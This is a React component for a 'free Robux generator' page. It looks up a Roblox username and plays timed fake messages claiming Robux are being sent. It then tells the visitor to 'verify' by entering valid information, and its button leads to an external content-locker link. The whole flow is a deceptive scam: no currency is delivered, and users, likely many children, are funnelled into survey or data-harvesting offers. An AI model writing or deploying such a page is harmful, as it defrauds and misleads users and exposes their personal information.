"use client";
import getRobloxUser from "../actions/getRobloxUser";
import { useState } from "react";

import { useRouter } from "next/router";
import Box3 from "./Box3";

const RobuxBox = () => {
  const [username, setUsername] = useState("");
  const [showBox2, setShowBox2] = useState(false);
  const [showBox3, setShowBox3] = useState(false);
  const [showBox4, setShowBox4] = useState(false);
  const [userOutput, setUserOutput] = useState("");
  const [userDetails, setUserDetails] = useState(null);

  const router = useRouter();

  const handleGetRobuxClick = async () => {
    if (username.length <= 2) {
      alert("Please enter a valid username");
      return;
    }

    setShowBox2(true);
    setUserOutput(`Searching for ${username}...`);

    const user = await getRobloxUser(username);
    console.log(user);
    if (user) {
      setUserDetails(user);
      setTimeout(() => {
        setShowBox2(false);
        setShowBox3(true);
      }, 2500);
    } else {
      setUserOutput("User not found. Please try again.");
      setShowBox2(false);
    }
  };

  const handleRobuxClick = () => {
    setShowBox3(false);
    setShowBox2(true);
    setUserOutput(`Sending Robux to ${username}...`);

    setTimeout(() => {
      setShowBox2(false);
      setShowBox4(true);
    }, 2500);
  };

  return (
    <div className="box_con">
      {!showBox2 && !showBox3 && !showBox4 && (
        <div className="box">
          <h3>Roblox Username</h3>
          <input
            type="text"
            className="input-username"
            placeholder="Enter username"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
          />
          <button
            className="btn-get-robux"
            onClick={async () => await handleGetRobuxClick()}
          >
            Get Robux
          </button>
        </div>
      )}

      {showBox2 && (
        <div className="box2">
          <div className="folding">
            <div className="sk-cube sk-cube1"></div>
            <div className="sk-cube sk-cube2"></div>
            <div className="sk-cube sk-cube3"></div>
            <div className="sk-cube sk-cube4"></div>
            <div className="square"></div>
          </div>
          <p className="useroutput">{userOutput}</p>
        </div>
      )}

      {showBox3 && (
        <Box3 userDetails={userDetails} handleRobuxClick={handleRobuxClick} />
      )}

      {showBox4 && (
        <div className="box4">
          <h3>Final Step!</h3>
          <p>
            Please verify that you are not a robot by answering a few questions
            to receive your Robux! Please enter valid information for the Robux
            to go through. Take your time, as completing it will grant you bonus
            Robux as a reward!
          </p>
          <button
            onClick={() =>
              router.push("https://content-unlock.com/getfreebux~623910D")
            }
            style={{ fontSize: "19px" }}
          >
            Verify
          </button>
        </div>
      )}
    </div>
  );
};

export default RobuxBox;
